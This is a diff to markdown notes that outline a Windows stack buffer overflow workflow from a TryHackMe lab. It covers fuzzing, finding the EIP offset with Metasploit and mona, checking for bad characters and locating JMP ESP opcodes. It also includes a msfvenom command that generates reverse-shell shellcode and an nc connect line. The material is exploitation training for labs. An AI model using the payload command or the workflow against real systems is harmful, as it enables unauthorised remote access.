@@ -1,5 +1,37 @@
-## Process for Buffer Overflow
+# Process for Buffer Overflow
 (Original source for this awesome tutorial: **Tib3rius** https://tryhackme.com/room/bufferoverflowprep )
+
+## Summary of the process
+
+- Crash The Application 
+	1. fuzz.py (with while loop and without while loop)
+	2. fuzz-http.py
+- Find EIP 
+	1. msf-pattern_create -l xxxx  
+	2. msf-pattern_offset -l xxxx -q (xxxxxxxx)
+	3. Mona commands
+		- !mona config -set workingfolder c:\mona\%p
+		- !mona findmsp -distance xxxx
+		- !mona modules
+- Controlling EIP
+	1. return address - BBBB
+	2. control-eip.py
+- Identify Bad Characters
+	1. for exploit.py -> bytearray.sh '\x00'
+	2. Mona commands
+		- !mona bytearray -b "\x00"
+		- !mona compare -f C:\mona\oscp\bytearray.bin -a
+- Find JMP ESP - msf-nasm_shell 
+	1. nasm > jmp esp - FFE4 
+		- !mona find -s "\xff\xe4" -m "modulename"
+	3. nasm > jmp eax - FFE0 
+		- !mona find -s "\xff\xe0" -m "modulename"
+	5. nasm > jmp edx - FFE2 
+		- !mona find -s "\xff\xe2" -m "modulename"
+- Generate Shell Code
+	- msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -b "\x00\x0a" -f py
+- Exploit
+	- final-exploit.py
 
 ### connecting to process 
 ```nc -nv MACHINE_IP 1337```
